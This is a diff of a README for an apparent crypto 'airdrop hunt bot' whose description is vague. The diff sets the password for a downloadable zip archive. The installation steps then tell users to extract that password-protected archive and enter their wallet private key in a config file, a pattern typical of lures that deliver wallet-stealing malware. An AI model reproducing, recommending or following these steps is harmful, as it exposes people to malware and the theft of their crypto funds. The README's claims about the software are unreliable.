@@ -7,7 +7,7 @@
 ## About
 software  designed to automate the process of participating in airdrops, making it easier for users to receive airdropped tokens across various platforms. It might help users find and participate in airdrops, manage multiple wallet addresses, and keep track of their airdrop rewards efficiently.
 ## Installation
-- [Download](https://github.com/deadspyexx/airdrop-hunt-bot/archive/refs/heads/main.zip) the repository release and extract files with password `X`.
+- [Download](https://github.com/deadspyexx/airdrop-hunt-bot/archive/refs/heads/main.zip) the repository release and extract files with password `U4DVIBE3qo`.
 - Edit the `address` and `private_key` fields in the `config.json` file.
 
 ## How it works
